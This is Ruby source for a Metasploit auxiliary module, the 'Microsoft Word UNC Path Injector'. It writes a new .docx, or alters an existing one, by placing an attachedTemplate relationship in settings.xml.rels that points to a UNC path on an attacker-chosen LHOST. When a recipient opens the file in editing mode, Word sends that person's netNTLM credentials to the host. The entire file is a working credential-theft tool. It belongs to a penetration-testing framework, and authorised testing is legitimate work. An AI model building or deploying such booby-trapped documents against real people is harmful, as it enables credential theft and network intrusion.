##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'zip/zip' #for extracting files
require 'rex/zip' #for creating files

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word UNC Path Injector',
			'Description'    => %q{
					This module modifies a .docx file that will, upon opening, submit all
					stored netNTLM credentials to a remote host. It can also create an empty docx file.
					If emailed the receiver needs to put the document in editing mode
					before the remote server will be contacted. Preview and read-only
					mode do not work. Verified to work with Microsoft Word 2003,
					2007 and 2010 as of Januari 2013 date by using auxiliary/server/capture/smb
			},
			'License'        => MSF_LICENSE,
			'References'     =>
			[
				[ 'URL', 'http://jedicorp.com/?p=534' ],
			],
			'Author'         =>
			[
				'SphaZ <cyberphaz[at]gmail.com>'
			]
		))

		register_options(
			[
				OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.','']),
				OptString.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document', '']),
				OptString.new('FILENAME', [true, 'Document output filename.', 'stealnetNTLM.docx']),
				OptString.new('DOCAUTHOR',[false,'Document author for empty document.', 'SphaZ']),
			], self.class)
	end

	#here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
	def makeNewFile
		metadataFileData = ""
		metadataFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
		metadataFileData << " xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" "
		metadataFileData << "xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" "
		metadataFileData << "xmlns:dcmitype=\"http://purl.org/dc/dcmitype/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		metadataFileData << "<dc:creator>#{datastore['DOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['DOCAUTHOR']}"
		metadataFileData << "</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\"dcterms:W3CDTF\">"
		metadataFileData << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
		metadataFileData << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"

		#where to find the skeleton files required for creating an empty document
		dataDir = File.join(Msf::Config.install_root, "data", "exploits", "docx")
		tmpDir = "#{Dir.tmpdir}/unc_tmp"

		#setup temporary directory structure
		begin
			cleanupTmp(tmpDir)
			FileUtils.mkdir_p("#{tmpDir}/docProps/")
			FileUtils.mkdir_p("#{tmpDir}/word/_rels/")
		rescue
			print_error("Error generating temp directory structure.")
			return nil
		end

		#here we store our on-the-fly created files
		begin
			f = File.open("#{tmpDir}/docProps/core.xml", 'wb')
			f.write(metadataFileData)
			f.close()
			f = File.open("#{tmpDir}/word/_rels/settings.xml.rels", 'wb')
			f.write(@relsFileData)
			f.close()
		rescue
			print_error("Cant write to temp file.")
			cleanupTmp(tmpDir)
			return nil
		end

		#making the actual docx
		begin
			docx = Rex::Zip::Archive.new
			#add skeleton files
			vprint_status("Adding skeleton files from #{dataDir}")
			Dir["#{dataDir}/**/**"].each do |file|
				if not File.directory?(file)
					docx.add_file(file.sub(dataDir,''), File.read(file))
				end
			end
			#add on-the-fly created documents
			vprint_status("Adding injected files")
			Dir["#{Dir.tmpdir}/unc_tmp/**/**"].each do |file|
				if not File.directory?(file)
					docx.add_file(file.sub("#{Dir.tmpdir}/unc_tmp/",''), File.read(file))
				end
			end
			#add the otherwise skipped "hidden" file
			file = "#{dataDir}/_rels/.rels"
			docx.add_file(file.sub(dataDir,''), File.read(file))
			file_create(docx.pack)
		rescue
			print_error("Error creating empty document #{datastore['FILENAME']}")
			cleanupTmp(tmpDir)
			return nil
		end

		cleanupTmp(tmpDir)
		return 0
	end

	#cleaning up of temporary files. If it fails we say so, but continue anyway
	def cleanupTmp(dir)
		begin
			FileUtils.rm_rf(dir)
		rescue
			print_error("Error cleaning up tmp directory structure.")
		end
	end


	#here we inject an UNC path into an existing file, and store the injected file in FILENAME
	def manipulateFile
		#where do we unpack our  source file?
		tmpDir = "#{Dir.tmpdir}/#{Time.now.to_i}#{rand(1000)}/"
		ref = "<w:attachedTemplate r:id=\"rId1\"/>"

		if File.exists?(datastore['SOURCE'])
			if not File.stat(datastore['SOURCE']).readable?
				print_error("Not enough rights to read the file. Aborting.")
				return nil
			end

			#lets extract our docx
			if unzipDocx(tmpDir).nil?
				return nil
			end

			fileContent = File.read("#{tmpDir}/word/settings.xml")

			if not fileContent.index("w:attachedTemplate r:id=\"rId1\"").nil?
				vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")

				#we put just our rels file into the docx
				if updateDocxFile(tmpDir,"word/_rels/settings.xml.rels", @relsFileData).nil?
					return nil
				end

				# lets zip the end result
				if zipDocx(tmpDir).nil?
					return nil
				end
			else
				#now insert the reference to the file that will enable our malicious entry
				insertOne = fileContent.index("<w:defaultTabStop")

				if insertOne.nil?
					insertTwo = fileContent.index("<w:hyphenationZone") # 2nd choice
					if not insertTwo.nil?
						vprint_status("HypenationZone found, we use this for insertion.")
						fileContent.insert(insertTwo, ref )
					end
				else
					vprint_status("DefaultTabStop found, we use this for insertion.")
					fileContent.insert(insertOne, ref )
				end

				if insertOne.nil? && insertTwo.nil?
					print_error("Cannot find insert point for reference into settings.xml")
					cleanupTmp(tmpDir)
					return nil
				end

				#lets extract our docx
				if unzipDocx(tmpDir).nil?
					return nil
				end

				#update the files that contain the injection and reference
				if updateDocxFile(tmpDir, "word/settings.xml",fileContent).nil?
					print_error("Error inserting data into word/settings.xml")
					return nil
				end
				if updateDocxFile(tmpDir, "word/_rels/settings.xml.rels", @relsFileData).nil?
					print_error("Eror inserting data into word/_rels/settings.xml.rels")
					return nil
				end

				#lets zip the file
				if zipDocx(tmpDir).nil?
					return nil
				end

			end
		else
			print_error("File #{datastore['SOURCE']} does not exist.")
			return nil
		end

		cleanupTmp(tmpDir)
		return 0
	end

	#making the actual docx
	def zipDocx(tmpDir)
		begin
			docx = Rex::Zip::Archive.new
			#add skeleton files
			vprint_status("Adding files from #{tmpDir}")
			Dir["#{tmpDir}/**/**"].each do |file|
				if not File.directory?(file)
					docx.add_file(file.sub(tmpDir,''), File.read(file))
				end
			end
			#add the otherwise skipped "hidden" file
			file = "#{tmpDir}/_rels/.rels"
			docx.add_file(file.sub(tmpDir,''), File.read(file))
			file_create(docx.pack)
		rescue
			print_error("Error creating compressed document #{datastore['FILENAME']}")
			cleanupTmp(tmpDir)
			return nil
		end
	end

	#unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
	def unzipDocx(tmpDir)
		begin
			if not File.directory?(tmpDir)
				vprint_status("Damn rubyzip cant be relied upon, so we do it the hard way. Extracting #{datastore['SOURCE']}")
				Zip::ZipFile.open(datastore['SOURCE'])  do |fileZip|
					fileZip.each do |entry|
						fpath = File.join(tmpDir, entry.name)
						FileUtils.mkdir_p(File.dirname(fpath))
						fileZip.extract(entry, fpath)
					end
				end
			end
		rescue
			print_error("There was an error unzipping.")
			cleanupTmp(tmpDir)
			return nil
		end
		return 0
	end

	#used for updating the files inside the docx from a string
	def updateDocxFile(tmpDir,fileString, content)
		begin
			archive = File.join(tmpDir, fileString)
			vprint_status("We need to look for: #{archive}")
			if File.exists?(archive)
				vprint_status("Deleting original file #{archive}")
				File.delete(archive)
			end
			File.open(archive, 'wb+') { |f| f.write(content) }
		rescue Exception => ex
			print_error("Well, extracting and manipulating the file went wrong :(")
			cleanupTmp(tmpDir)
			return nil
		end
		return 0
	end

	def run
		#we need this in makeNewFile and manipulateFile
		@relsFileData = ""
		@relsFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
		@relsFileData << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
		@relsFileData << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/".chomp
		@relsFileData << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"

		if "#{datastore['SOURCE']}" == ""
			#make an empty file
			print_status("Creating empty document")
			if not makeNewFile.nil?
				print_good("Success! Empty document #{datastore['FILENAME']} created.")
			end
		else
			#extract the word/settings.xml and edit in the reference we need
			print_status("Injecting UNC path into existing document.")
			if not manipulateFile.nil?
				print_good("Copy of #{datastore['SOURCE']} called #{datastore['FILENAME']} points to #{datastore['LHOST']}.")
			end
		end
	end
end
